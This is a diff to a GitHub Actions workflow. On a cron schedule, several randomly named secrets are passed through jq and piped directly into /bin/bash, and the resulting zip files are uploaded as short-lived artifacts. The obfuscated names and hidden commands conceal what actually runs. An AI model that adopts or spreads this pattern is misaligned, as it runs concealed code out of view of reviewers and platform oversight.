@@ -1,29 +1,27 @@
 name: daoxiaozaolv
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '56 5/6 * * *'
-jobs:  # 26814
+    - cron: '33 1,7,13,19 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: daoxiaozaolv
         env:
-          rvgtd40191: ${{ secrets.rvgtd40191 }}
+          epe32: ${{ secrets.epe32 }}
         run: |
-          echo $rvgtd40191 | jq -r .ly34 | /bin/bash
-          echo $whm158 | jq -r .vm6 | /bin/bash
-          echo $zn678 | jq -r .pimb0 | /bin/bash
-          echo $mevb71 | jq -r .wif01 | /bin/bash
-          echo $mf6 | jq -r .sfjds5398 | /bin/bash
-          echo $xgi8017 | jq -r .tlox76391 | /bin/bash
-          echo $o5 | jq -r .jq7 | /bin/bash
-          echo $xj178 | jq -r .fk9 | /bin/bash
-          echo $t8741 | jq -r .dfub91722 | /bin/bash
-          echo $ubwli57923 | jq -r .rq4676 | /bin/bash
-          echo $d81 | jq -r .f1 | /bin/bash
-          echo $z134 | jq -r .ivhiy154 | /bin/bash
-          echo $ft496 | jq -r .wjt28 | /bin/bash
+          printf '%s' "$epe32" | jq -r .hf50656 | /bin/bash
+          printf '%s' "$eher17" | jq -r .pllq7108 | /bin/bash
+          echo $b87862 | jq -r .s57355 | /bin/bash
+          echo $hzp6 | jq -r .tw689 | /bin/bash
+          echo $lohx702 | jq -r .lf8 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: zev6RhZw
+          path: "*.zip"
+          retention-days: 1
